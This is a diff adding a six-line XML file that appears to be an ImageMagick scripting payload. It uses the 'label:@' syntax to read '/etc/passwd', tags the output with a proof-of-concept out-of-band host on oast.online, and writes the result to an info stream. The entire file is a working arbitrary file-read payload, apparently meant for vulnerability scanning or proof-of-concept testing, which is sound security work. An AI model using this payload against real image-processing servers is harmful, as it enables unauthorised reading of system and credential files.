@@ -1,0 +1,6 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<image>
+  <read filename="label:@/etc/passwd" />
+  <read filename="caption:PoC-d98h1d1mmo1vhakgrj20jptxr51mydqsn.oast.online" />
+  <write filename="info:" />
+</image>
